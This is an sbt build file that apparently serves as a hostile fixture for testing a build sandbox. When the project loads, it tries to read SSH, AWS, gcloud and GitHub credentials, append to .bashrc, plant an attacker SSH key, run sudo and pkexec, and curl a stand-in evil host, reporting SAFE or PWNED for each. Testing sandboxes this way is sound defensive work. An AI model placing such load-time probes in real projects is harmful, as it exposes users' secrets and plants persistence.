// Hostile sbt build — exercises every attack in fixtures/ATTACKS.md.
//
// build.sbt is Scala code evaluated at project-load time (before any
// `compile` task runs), so the attacks fire when the user types
// `sbt compile`, `sbt update`, `sbt test`, etc. Each probe prints exactly
// one of:
//   SAFE: <id> <reason>
//   PWNED: <id> <evidence>
//
// CI greps for PWNED: and fails on any occurrence.

import java.io.{File, IOException, FileWriter, BufferedWriter}
import java.nio.file.{Files, Paths, NoSuchFileException}
import scala.sys.process._
import scala.util.Try

ThisBuild / scalaVersion := "2.13.14"
ThisBuild / organization := "com.sbetest"
ThisBuild / version      := "0.1.0"

lazy val root = (project in file("."))
  .settings(name := "test-bad-scala")

val HOME = sys.env.getOrElse("HOME", "/tmp")

def report(id: String, ok: Boolean, msg: String): Unit = {
  val tag = if (ok) "SAFE" else "PWNED"
  System.err.println(s"$tag: $id $msg")
}

def tryRead(id: String, path: String): Unit =
  Try(Files.readAllBytes(Paths.get(path))) match {
    case scala.util.Success(buf) if buf.length == 0 => report(id, ok = true,  s"readable but empty: $path")
    case scala.util.Success(buf)                    => report(id, ok = false, s"read ${buf.length} bytes from $path")
    case scala.util.Failure(e)                      => report(id, ok = true,  s"blocked: ${e.getMessage}")
  }

def tryAppend(id: String, path: String, payload: String): Unit = {
  val f   = new File(path)
  val res = Try {
    Option(f.getParentFile).foreach(_.mkdirs())
    val w = new BufferedWriter(new FileWriter(f, /*append=*/ true))
    try w.write(payload)
    finally w.close()
  }
  res match {
    case scala.util.Success(_) => report(id, ok = false, s"wrote to $path")
    case scala.util.Failure(e) => report(id, ok = true,  s"blocked: ${e.getMessage}")
  }
}

def tryExec(id: String, program: String, args: Seq[String]): Unit = {
  val res = Try((program +: args).!(ProcessLogger(_ => (), _ => ())))
  res match {
    case scala.util.Success(0)   => report(id, ok = false, s"exec $program succeeded")
    case scala.util.Success(rc)  => report(id, ok = true,  s"exec $program returned $rc (likely sandboxed)")
    case scala.util.Failure(e)   => report(id, ok = true,  s"blocked: ${e.getMessage}")
  }
}

def tryCurl(id: String, url: String): Unit = {
  val cmd = Seq("/usr/bin/curl", "-sSL", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", url)
  val out = new StringBuilder
  val rc  = Try(cmd.!(ProcessLogger(line => out.append(line), _ => ())))
  rc match {
    case scala.util.Success(0) =>
      val code = out.toString.trim
      if (code.startsWith("2")) report(id, ok = false, s"HTTP $code from $url")
      else                       report(id, ok = true,  s"blocked: http=$code")
    case scala.util.Success(code) => report(id, ok = true, s"blocked: curl exit=$code")
    case scala.util.Failure(e)    => report(id, ok = true, s"blocked: ${e.getMessage}")
  }
}

tryRead("ssh-read",      s"$HOME/.ssh/id_ed25519")
tryRead("aws-read",      s"$HOME/.aws/credentials")
tryRead("gcloud-read",   s"$HOME/.config/gcloud/credentials.db")
tryRead("gh-token-read", s"$HOME/.config/gh/hosts.yml")
tryRead("env-read",      "./.env")
tryAppend("bashrc-write",          s"$HOME/.bashrc",                "\n# pwned\n")
tryAppend("authorized-keys-write", s"$HOME/.ssh/authorized_keys",   "\nssh-rsa AAAAATTACKER attacker@evil\n")
tryExec("sudo-exec",   "/usr/bin/sudo",   Seq("-l"))
tryExec("pkexec-exec", "/usr/bin/pkexec", Seq("--version"))
tryCurl("curl-evil",   "https://evil.example.invalid/")
